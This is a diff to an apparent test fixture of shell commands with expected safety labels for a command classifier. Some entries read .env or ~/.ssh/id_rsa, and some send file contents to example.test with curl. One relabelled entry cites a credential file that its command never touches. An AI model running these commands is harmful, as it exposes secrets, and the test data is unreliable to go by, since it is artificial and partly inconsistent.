@@ -1,6 +1,6 @@
 {"rows":[
  {"id":"query-aggregate","partition":"aggregate","expected":"UC","input":{"command":"Q=\"\"; while IFS= read -r id; do [ -z \"$id\" ] && continue; Q=\"${Q}&x=${id}\"; done < public.txt; for CLOSED in true false; do URL=\"https://example.test/?closed=${CLOSED}${Q}\"; curl -sS \"$URL\" -o public.json; done"}},
- {"id":"nested-query-aggregate","partition":"aggregate","expected":"UC","input":{"command":"for f in chunk_*; do Q=\"\"; while IFS= read -r id; do [ -z \"$id\" ] && continue; Q=\"${Q}&x=${id}\"; done < \"$f\"; for CLOSED in true false; do URL=\"https://example.test/?closed=${CLOSED}${Q}\"; curl -sS \"$URL\" -o public.json; done; done"}},
+ {"id":"nested-query-aggregate","partition":"aggregate","expected":"D","input":{"command":"for f in chunk_*; do Q=\"\"; while IFS= read -r id; do [ -z \"$id\" ] && continue; Q=\"${Q}&x=${id}\"; done < \"$f\"; for CLOSED in true false; do URL=\"https://example.test/?closed=${CLOSED}${Q}\"; curl -sS \"$URL\" -o public.json; done; done"},"wire_reason":"credential-file"},
  {"id":"nested-hit-aggregate","partition":"aggregate","expected":"N","input":{"command":"for p in public-one public-two; do hit=\"\"; for c in $(git log --format=%H -- $p); do [ \"$(printf public)\" = public ] && hit=\"$hit ${c:0:7}:$p\"; done; echo \"$hit\"; done"}},
  {"id":"aggregate-env-source","partition":"aggregate-protected","expected":"D","input":{"command":"Q=\"\"; while read id; do Q=\"${Q}&x=${id}\"; done < .env; echo \"$Q\""}},
  {"id":"aggregate-appdata-prefix","partition":"aggregate-protected","expected":"D","input":{"command":"Q=$C; while read id; do Q=\"${Q}/${id}\"; cat \"$Q\"; done < public.txt"}},
@@ -19,5 +19,6 @@
  {"id":"substitution-union-public","partition":"substitution","expected":"N","input":{"command":"for a in public-one public-two; do for b in one two; do Q=\"${a}$(cat \"$a\")${b}\"; echo \"$Q\"; done; done"}},
  {"id":"substitution-union-env","partition":"substitution","expected":"D","input":{"command":"for a in public .env; do for b in one two; do Q=\"${a}$(cat \"$a\")${b}\"; echo \"$Q\"; done; done"}},
  {"id":"substitution-union-appdata","partition":"substitution","expected":"D","input":{"command":"for a in public $C; do for b in one two; do Q=\"${a}$(cat \"$a\")${b}\"; echo \"$Q\"; done; done"}},
- {"id":"substitution-union-private","partition":"substitution","expected":"D","input":{"command":"for a in public $H/.ssh/id_rsa; do for b in one two; do Q=\"${a}$(cat \"$a\")${b}\"; echo \"$Q\"; done; done"}}
+ {"id":"substitution-union-private","partition":"substitution","expected":"D","input":{"command":"for a in public $H/.ssh/id_rsa; do for b in one two; do Q=\"${a}$(cat \"$a\")${b}\"; echo \"$Q\"; done; done"}},
+ {"id":"nested-query-aggregate-text","partition":"aggregate","expected":"UC","input":{"command":"for f in chunk_*.txt; do Q=\"\"; while IFS= read -r id; do [ -z \"$id\" ] && continue; Q=\"${Q}&x=${id}\"; done < \"$f\"; for CLOSED in true false; do URL=\"https://example.test/?closed=${CLOSED}${Q}\"; curl -sS \"$URL\" -o public.json; done; done"}}
 ]}
